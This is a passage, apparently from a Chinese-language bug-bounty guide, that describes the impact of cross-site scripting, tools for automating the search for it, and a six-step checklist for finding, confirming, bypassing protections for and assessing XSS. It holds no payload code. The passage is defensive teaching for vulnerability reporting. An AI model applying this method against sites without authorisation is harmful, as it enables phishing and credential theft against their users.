XSS 还可用于动态更改受害者看到的页面，例如将页面替换为伪造的登录页面，诱骗用户提供凭据（通常称为网络钓鱼）。XSS 还可让攻击者自动将受害者重定向到恶意页面，并伪装成合法站点执行其他有害操作，如安装恶意软件。在报告你发现的 XSS 之前，请务必全面评估该特定 XSS 的影响，以便在漏洞报告中包含这些信息。

## 自动化 XSS 寻找

XSS 寻找可能非常耗时。你可能花费数小时检查不同的请求参数却一无所获。幸运的是，你可以使用工具提高效率。

首先，可以使用浏览器开发者工具查找语法错误并对载荷进行故障排除。我也喜欢使用代理的搜索工具来搜索服务器响应中的反射输入。最后，如果目标程序允许自动测试，你可以使用 Burp Intruder 或其他模糊测试工具对目标进行自动 XSS 扫描。我们将在第 25 章中讨论相关内容。

## 找到你的第一个 XSS！

立即开始寻找你的第一个 XSS 吧！选择一个目标，并遵循本章介绍的步骤：

1. **寻找应用程序中的用户输入机会**。当用户输入被存储并稍后用于构建网页时，测试存储型 XSS。如果 URL 中的用户输入被反射回生成的网页，则测试反射型和 DOM XSS。
2. **在你发现的用户输入字段中插入 XSS 载荷**。可以插入在线列表中的载荷、polyglot 载荷或通用测试字符串。
3. **通过检查浏览器是否运行了你的 JavaScript 代码来确认载荷的影响**。对于盲 XSS，查看是否能让受害者浏览器向你的服务器发出请求。
4. **如果无法执行任何载荷，尝试绕过 XSS 防护措施**。
5. **使用第 25 章介绍的技术自动化 XSS 寻找过程**。
6. **考虑你发现的 XSS 的影响**：针对谁？影响多少用户？你能用它实现什么？能否利用发现的内容升级攻击？
